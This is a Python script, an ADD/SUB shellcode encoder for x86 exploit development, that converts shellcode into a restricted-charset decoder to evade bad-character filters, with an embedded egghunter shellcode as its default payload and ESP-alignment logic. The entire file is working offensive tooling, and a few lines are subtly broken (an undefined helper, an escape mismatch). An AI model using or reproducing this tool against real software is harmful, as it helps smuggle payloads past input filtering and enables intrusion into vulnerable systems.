#!/usr/bin/env python
# Code for find_terms function adapted from https://vulners.com/metasploit/MSF:ENCODER/X86/OPT_SUB

"""
# ADD/SUB shellcode encoder

# Generates assembly instruction using only the specified allowed charset.
# The generated instruction will decode the original shellcode by chunks of 4 bytes on the stack
# using one or more SUB/ADD EAX instructions followed by a PUSH EAX

# charset(-hex) should be a (hex) string containing valid characters to be used by the decoder
# It requires an average of 16 bytes per 4 bytes of shellcode to be decoded and 19 bytes for ESP alignment
# If EAX needs to be zeroized, this will generate an additional 12 bytes the 1st time and 2 bytes for each subsequent need

Usage:
    sc_sub_encoder.py [options] [<shellcode>]

Example:
     ./sc_sub_encoder.py -e knar -c 0x1034E1E8 -t 0x1035FFF0 -s 0x1000 -C MAN- --charset-hex="0102030405060708090b0c0e0f"

Options:
    <shellcode>           The escaped shellcode to encode; if not provided, NtAccessCheckAndAuditAlarm EggHunter will be used
    -e <egg>              The 4-bytes egg to use with the NtAccessCheckAndAuditAlarm EggHunter; defaults to "knar"
    -c <esp_current>      The address of ESP at the first instruction of the generated decoder shellcode
    -t <esp_target>       The target address of the ESP register where the shellcode should be decoded;
                          Should be separated from the decoder shellcode by a sled of inoffensive instructions
                          If esp_current and esp_target are not provided, ESP must already point to the address where the shellcode will be decoded
    -s <value>            Prefix the shellcode to encode with SUB esp, <value>
                          Might be required if payload crashes (the decoded shellcode may be overwriting itself)
    -C [MULANSC%-+]       The charset to be used for encoding; Defaults to mandatory/alphanumeric/SUBEAX [MAN-]
                          M : Mandatory opcodes               (See below)
                          % : Standard ASCII                  (0x00-0x7F)
                          C : Control                         (0x00-0x1F, 0x7F)
                          S : Symbols                         (0x20-0x2F, 0x3A-0x40; 0x5B-0x60; 0x7B-0x7E)
                          N : Numbers               [0-9]     (0x30-0x39)
                          U : Uppercase alphabet    [A-Z]     (0x41-0x5A)
                          L : Lowercase alphabet    [a-z]     (0x61-0x7A)
                          A : Complete  alphabet    [A-Z,a-z] (0x41-0x5A, 0x61-0x7A)
                          - : SUB EAX               [-]       (0x2D)
                          + : ADD EAX               <ENQ>     (0x05)
    --charset=<cs>        A string containing the allowed charset.
    --charset-hex=<cs>    An hex string containing the allowed charset.
    --badchar=<bad>       A string containing the badchars
    --badchar-hex=<bad>   An hex string containing the badchars
    --min=<minop>         The minimum number of ADD/SUB components per chunk (default: 1)
    --max=<maxop>         The maximum number of ADD/SUB components per chunk (default: 3)

The following opcodes are required in the valid charset for the script to work:
    AND_EAX    "\\x25"    # %
    PUSH_EAX   "\\x50"    # P
    PUSH_EDX   "\\x52"    # R
    PUSH_ESP   "\\x54"    # T
    POP_EAX    "\\x58"    # X
    POP_EDX    "\\x5a"    # Z
    POP_ESP    "\\x5c"    # \\

and at least one of those 2:
    ADD_EAX    "\\x05"    # <ENQ>
    SUB_EAX    "\\x2d"    # -

"""



# Valid Charset definition
SET_ALPHAU   = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" # 0x41 --> 0x5A
SET_ALPHAL   = "abcdefghijklmnopqrstuvwxyz" # 0x61 --> 0x7A
SET_NUM      = "0123456789"                 # 0x30 --> 0x39
SET_SYM      = "!@#$%^&*()_+\\-=[]{};'\":<>,.?/|~"
SET_FILESYM  = '()_+-=\\/.,[]{}@!$%^&='
MAND_OPCODES = "\x25\x50\x52\x54\x58\x5A\x5C"
ADDEAX       = "\x05"
SUBEAX       = "\x2d"

# ------------------------------------------------------------
#              NO USER-SERVICEABLE VAR BELOW THIS
# ------------------------------------------------------------

import binascii
import struct
import sys
import time
import docopt
from itertools import combinations



CRED = "\033[91m"; CGRE = "\033[92m"; CYEL = "\033[93m"; CBLU = "\033[94m"; CPUR = "\033[95m"; CCYA = "\033[96m"; CWHI = "\033[97m"; CRST = "\033[0m"; BRED= "\033[41m"

OC = {
    "ADD_EAX"  : "\x05",    # <ENQ>
    "AND_EAX"  : "\x25",    # %
    "SUB_EAX"  : "\x2d",    # -
    "PUSH_EAX" : "\x50",    # P
    "PUSH_EDX" : "\x52",    # R
    "PUSH_ESP" : "\x54",    # T
    "POP_EAX"  : "\x58",    # X
    "POP_EDX"  : "\x5a",    # Z
    "POP_ESP"  : "\x5c",    # \
}

REQUIRED_OPCODES = [
#    OC["ADD_EAX"],
    OC["AND_EAX"],
#    OC["SUB_EAX"],
    OC["PUSH_EAX"],
    OC["PUSH_EDX"],
    OC["PUSH_ESP"],
    OC["POP_EAX"],
    OC["POP_EDX"],
    OC["POP_ESP"],
]

def check_valid_bytes(goodchar):
    valid_bytes = set()
    for c in goodchar:
        valid_bytes.add(ord(c))
    valid_bytes = list(valid_bytes)

    valid_chars = ""
    for i in valid_bytes:
        valid_chars += "0x%02x " %i
        if i in range(0x20, 0x7f):
            valid_chars += "(%s) " % chr(i)

    missing_opcodes = []
    for opcode in REQUIRED_OPCODES:
        if ord(opcode) not in valid_bytes:
            halt = True
            missing_opcodes.append("0x%02x: %s \t(%s)" % (ord(opcode), OC.keys()[OC.values().index(opcode)], ascii_san(opcode)))

    if missing_opcodes :
        print("\n%sMissing the following opcodes in the valid charset to build shellcode :%s" % (CRED, CRST))
        for opcode in missing_opcodes:
            print(opcode)
        print("\n"*3)
        sys.exit()
    return valid_bytes, valid_chars


def pad(str, int, chr):
    while len(str) % int:
        str += chr
    return str


def stre(s):
    return ''.join('\\x' + binascii.hexlify(c) for c in s)


def split_word(hexstr):
    n = 8
    return [(int(hexstr[i:i+n], 16)) for i in range(0, len(hexstr), n)]


def check_nullbyte(ints):
    if 0 not in valid_bytes:
        for int in ints:
            for byte_num in range(3,-1,-1):
                if int >> (byte_num * 8) & 0xFF == 0:
                    return False
    return True


def find_terms(chunk, previous=0):
    nosub = noadd = 1
    if ord(OC["SUB_EAX"]) in valid_bytes : nosub = 0
    if ord(OC["ADD_EAX"]) in valid_bytes : noadd = 0
    assert  noadd + nosub != 2

    if chunk == previous:
        terms = []
        return terms, chunk, None

    target_s = previous - chunk     # SUB
    target_a = chunk - previous     # ADD

    for terms_count in range(MIN_COMPONENTS, MAX_COMPONENTS+1):
        terms_s = [0] * terms_count
        terms_a = [0] * terms_count
        carry_s = carry_a = 0

        for byte_num in range(0, 4):
            b_s =  target_s >> (byte_num * 8) & 0xFF
            b_a =  target_a >> (byte_num * 8) & 0xFF
            ops_found = b_s_found = b_a_found = b_x_found = 0

            for combo in combinations(valid_bytes, len(terms_s)):
                # get the total of the current bytes combo, including the carry from
                # the previous calculation
                total_s = sum(combo) + carry_s
                total_a = sum(combo) + carry_a

                # if we matched a SUB byte..
                if (total_s & 0xFF) == b_s and not b_s_found:
                    # store the carry for the next calculation
                    carry_s = (total_s >> 8) & 0xFF
                    # store the values in their respective locations
                    for i in range(len(terms_s)):
                        terms_s[i] |= combo[i] << (byte_num * 8)
                    b_s_found = 1

                # if we matched a ADD byte..
                if (total_a & 0xFF) == b_a and not b_a_found:
                    carry_a = (total_a >> 8) & 0xFF
                    for i in range(len(terms_a)):
                        terms_a[i] |= combo[i] << (byte_num * 8)
                    b_a_found = 1

                # break if combo found for all available operand
                if (b_s_found or nosub) and (b_a_found or noadd):
                    break

        # if a solution is found
        if previous == sum(terms_s, chunk) % 2**32 and ord(OC["SUB_EAX"]) in valid_bytes and check_nullbyte(terms_s):
            opr = OC["SUB_EAX"]
            return terms_s, chunk, opr

        if chunk == sum(terms_a, previous) % 2**32 and ord(OC["ADD_EAX"]) in valid_bytes and check_nullbyte(terms_a):
            opr = OC["ADD_EAX"]
            return terms_a, chunk, opr

    # raise exception if no solution found
    assert previous == sum(terms_s, chunk) % 2**32 and no_nullbyte(terms_s)


def find_opposite_bytes(list):
    for b1 in list:
        for b2 in list:
            if b1 & b2 == 0:
                return b1, b2
    return None, None


def ascii_san(s):
    san = ""
    for c in s:
        if ord(c) in range(0x20, 0x7f):
            san += c
        else:
            san += "."
    return san


def zeroize_eax(sc_enc, sc_enc_verb, eaxz):
    eax1, eax2 = find_opposite_bytes(valid_bytes)
    if eaxz == 0:
        sc_enc_verb += "# Zeroizing EAX and saving value into EDX\n"
        sc_enc      += "%s%s%s%s%s" % (chr(0x25), chr(eax1), chr(eax1), chr(eax1), chr(eax1))
        sc_enc      += "%s%s%s%s%s" % (chr(0x25),chr(eax2), chr(eax2), chr(eax2), chr(eax2))
        sc_enc_verb += "\"\\x25\\x%02x\\x%02x\\x%02x\\x%02x\"    # AND EAX 0x%02x%02x%02x%02x\n" % (eax1, eax1, eax1, eax1, eax1, eax1, eax1, eax1)
        sc_enc_verb += "\"\\x25\\x%02x\\x%02x\\x%02x\\x%02x\"    # AND EAX 0x%02x%02x%02x%02x\n" % (eax2, eax2, eax2, eax2, eax2, eax2, eax2, eax2)
        sc_enc      += "\x50"
        sc_enc      += "\x5A"
        sc_enc_verb += "\"\\x50\"                    # PUSH EAX\n"
        sc_enc_verb += "\"\\x5A\"                    # POP EDX\n\n"
        eaxz = 1
    else:
        sc_enc_verb += "# Zeroizing EAX from EDX\n"
        sc_enc      += "\x52"
        sc_enc      += "\x58"
        sc_enc_verb += "\"\\x52\"                    # PUSH 0x%08x (EDX)\n" % 0
        sc_enc_verb += "\"\\x58\"                    # POP EAX\n\n"
    return sc_enc, sc_enc_verb, eaxz


def encodesc(sc, esp_cur=None, esp_tgt=None):
    eaxz = 0
    sc_enc = ""
    sc_enc_verb = "# " + "-"*60
    previous = 0

    # Step 1: Reverse shellcode (setup correct endianness for decoding)
    sc = sc[::-1]

    # Step 2: Pad shellcode to DWORDS
    sc = pad(sc, 4, "\x90")
    sc_hex =  binascii.hexlify(sc)

    # Step 3: Split shellcode into DWORDS
    sc_words = split_word(sc_hex)

    sc_enc_verb += "\n"
    sc_enc_verb += sc_desc
    sc_enc_verb += "\n# length: LENPLACEHOLDER bytes\n\n"
    sc_enc_verb += "shellcode_decoder = (\n"

    # Step 4: Compute ESP alignment shellcode
    if esp_cur and esp_tgt:
        sc_enc_verb += "# Perform ESP offset alignment towards desired target\n"
        sc_enc_verb += "# ESP=0x%08x, Target=0x%08x: " % (esp_cur, esp_tgt)

        try:
            terms, previous, opr = find_terms(esp_tgt, esp_cur)

        except AssertionError :
            sc_enc_verb += " %sNOK%s\n" % (CRED, CRST)
            sc_enc_verb += "# %s/!\ WARNING: Cannot compute target ESP with the available charset %s\n" % (CRED, CRST)
            sc_enc_verb += "# %s/!\ ESP must already point to the address where the shellcode will be decoded /!\ %s\n" % (CRED, CRST)
            sc_enc_verb += "# Memory layout should be EIP (Current shellcode) --> SLED --> Target ESP\n\n\n"

        else:
            sc_enc_verb += " %sOK%s \n" % (CGRE, CRST)
            # Get ESP into EAX
            sc_enc      += "\x54"
            sc_enc      += "\x58"
            sc_enc_verb += "\"\\x54\"                    # PUSH ESP\n"
            sc_enc_verb += "\"\\x58\"                    # POP EAX\n"

            for term in terms:
                sc_enc      +=             opr + struct.pack('<I', term)
                sc_enc_verb += "\"" + stre(opr + struct.pack('<I', term))
                if opr == "\x2d" :
                    sc_enc_verb += "\"    # SUB EAX, 0x%08x\n" % term
                elif opr == "\x05" :
                    sc_enc_verb += "\"    # ADD EAX, 0x%08x\n" % term
                else:
                    sc_enc_verb += "\"\n"

            sc_enc      += "\x50"
            sc_enc      += "\x5C"
            sc_enc_verb += "\"\\x50\"                    # PUSH 0x%x (EAX)\n" % esp_target
            sc_enc_verb += "\"\\x5C\"                    # POP ESP\n"
            sc_enc_verb += "# Memory layout should be EIP (Current shellcode) --> SLED --> ESP (0x%x)\n\n" %esp_target
    else:
        sc_enc_verb += "# %s/!\ WARNING: No value provided for ESP current/target /!\%s\n" % (CRED, CRST)
        sc_enc_verb += "# %s/!\ ESP must already point to the address where the shellcode will be decoded /!\%s\n" % (CRED, CRST)
        sc_enc_verb += "# Memory layout should be EIP (Current shellcode) --> SLED --> Target ESP\n\n"

    # Step 5: Compute the add/sub terms for each chunk; each computation will take the previous target as starting point
    for i in range(len(sc_words)):
        if i != 0: sc_enc_verb += "\n"
        if previous == 0:
            sc_enc, sc_enc_verb, eaxz = zeroize_eax(sc_enc, sc_enc_verb, eaxz)
            sc_enc_verb += "\n"

        # Compute each chunk add/sub components
        sc_enc_verb += "# EAX=0x%08x, Target=0x%08x:" % (previous, sc_words[i])
        try:
            terms, previous, opr = find_terms(sc_words[i], previous)

        # If the computation failed, try again starting with EAX = 0
        except AssertionError as e:
            previous = 0
            sc_enc_verb += " %sNOK%s\n" % (CRED, CRST)
            sc_enc, sc_enc_verb, eaxz = zeroize_eax(sc_enc, sc_enc_verb, eaxz)
            sc_enc_verb += "# EAX=0x%08x, Target=0x%08x:" % (previous, sc_words[i])
            try:
                terms, previous, opr = find_terms(sc_words[i], previous)

            # If it failed again, abort
            except AssertionError as e:
                sc_enc_verb += " %sNOK%s\n" % (CRED, CRST)
                sc_enc_verb += "# %s/!\ No solution found with the available charset %s\n)" % (CRED, CRST)
                print(sc_enc_verb)
                raise Exception("%sno solution with available charset within a range of [%i-%i] operations per chunk%s\nCharset: %s" % (CRED, MIN_COMPONENTS, MAX_COMPONENTS, CRST, valid_chars))

            else:
                sc_enc_verb += " %sOK%s \n" % (CGRE, CRST)

        else:
            sc_enc_verb += " %sOK%s \n" % (CGRE, CRST)

        # Produce the decoding instructions
        for term in terms:
            sc_enc      +=             opr + struct.pack('<I', term)
            sc_enc_verb += "\"" + stre(opr + struct.pack('<I', term))
            if opr == "\x2d" :
                sc_enc_verb += "\"    # SUB EAX, 0x%08x\n" % term
            elif opr == "\05" :
                sc_enc_verb += "\"    # ADD EAX, 0x%08x\n" % term
            else:
                sc_enc_verb += "\"\n"

        # Push the decoded shellcode chunk on the stack
        sc_enc      += "\x50"
        sc_enc_verb += "\"\\x50\"                    # PUSH 0x%08x (EAX)\n" % sc_words[i]

    # End the variable
    sc_enc_verb += ")\n# " + "-"*60 + "\n\n"

    # Write shellcode length in the header
    sc_enc_verb = sc_enc_verb.replace("LENPLACEHOLDER",str(len(sc_enc)))

    return sc_enc, sc_enc_verb


def main():
    args = docopt.docopt(__doc__)
    #print(args)

    global goodchar
    global valid_bytes
    global valid_chars
    global sc_desc
    global MIN_COMPONENTS
    global MAX_COMPONENTS
    global esp_current
    global esp_target

    sc_desc = ""

    if args["-c"]:
        esp_current=int(args["-c"],16)
        print("ESP Current: 0x%08x " % esp_current)
    else:
        esp_current=""

    if args["-t"]:
        esp_target=int(args["-t"],16)
        print("ESP Target:  0x%08x" % esp_target)
    else:
        esp_target=""


    if args["<shellcode>"]:
        print("Using shellcode provided from command line: ")
        sc = binascii.unhexlify(args["<shellcode>"].replace("\\x","").replace(" ",""))
    else:
        if args["-e"]:
            if len(args["-e"]) == 4:
                egg=args["-e"]
            else:
                print("Provided egg's length is not equal 4, using default egg 'knar'")
                egg = "knar"
        else:
            egg = "knar"
        print("No shellcode provided, using NtAccessCheckAndAuditAlarm EggHunter with egg %s" % egg)
        sc = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" + egg + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
        sc_desc = "# NtAccessCheckAndAuditAlarm Shellcode Egghunter\n# Egg: %s" %egg

    if args["-s"]:
        subval = int(args["-s"],16)
        subesp = "\x81\xEC" + struct.pack('<I',subval) + "AA"
        print("Prefixing shellcode with 'SUB esp, 0x%04x' (%s)" % (subval,stre(subesp)))
        sc = subesp + sc

    goodchar = ""
    if args["-C"]:
        charlist = args["-C"]
    else:
        if not args["--charset-hex"] and not args["--charset"]:
            charlist = "MAN-"

    if "A" in charlist:
        goodchar += ''.join(chr(i) for i in (range(0x41,0x5B,1) + range(0x61,0x7B,1)))
    if "U" in charlist:
        goodchar += ''.join(chr(i) for i in range(0x41,0x5B,1))
    if "L" in charlist:
        goodchar += ''.join(chr(i) for i in range(0x61,0x7B,1))
    if "N" in charlist:
        goodchar += ''.join(chr(i) for i in range(0x30,0x3A,1))
    if "M" in charlist:
        goodchar += ''.join(REQUIRED_OPCODES)
    if "+" in charlist:
        goodchar += "\x05"  #ADD EAX
    if "-" in charlist:
        goodchar += "\x2d"  #SUB EAX
    if "C" in charlist:
        goodchar += ''.join(chr(i) for i in (range(0x0,0x20,1) + [0x7F]))
    if "S" in charlist:
        goodchar += ''.join(chr(i) for i in (range(0x20,0x30,1) + range(0x3A,0x41,1) + range(0x5B,0x61,1) + range(0x7B,0x7F,1)))
    if "%" in charlist:
        goodchar += ''.join(chr(i) for i in range(0x0,0x80,1))

    if args["--charset-hex"]:
        goodchar += binascii.unhexlify(args["--charset-hex"].replace("\\x",""))

    if args["--charset"]:
        goodchar += args["--charset"]

    if args["--badchar-hex"]:
        badchars = binascii.unhexlify(args["--badchar-hex"].replace("\\x",""))
        for c in badchars:
            goodchar = goodchar.replace(c,"")

    if args["--badchar"]:
        for c in args["--badchar"]:
            goodchar = goodchar.replace(c,"")

    if args["--min"]:
        MIN_COMPONENTS = int(args["--min"])
    else:
        MIN_COMPONENTS = 1

    if args["--max"]:
        MAX_COMPONENTS = int(args["--max"])
    else:
        MAX_COMPONENTS = 3

    start = time.time()
    valid_bytes, valid_chars = check_valid_bytes(goodchar)
    sc_encoded, sc_encoded_verb = encodesc(sc, esp_current, esp_target)
    dur = time.time() - start

    print("\nValid charset (%i): %s\n\n\n" % (len(valid_bytes),valid_chars))

    print("" + sc_encoded_verb)
    print("Solution computed in %f seconds\n" % dur )
    print("Original shellcode length: %i" %len(sc))
    print("Encoded  shellcode length: %i" % len(sc_encoded))
    print("\noriginal_shellcode = \"%s\"") % stre(sc)
    print("\nshellcode_decoder = \"%s\"")  % stre(sc_encoded)
    print("\nASCII : \"%s\"") % ascii_san(sc_encoded)


if __name__ == "__main__":
    main()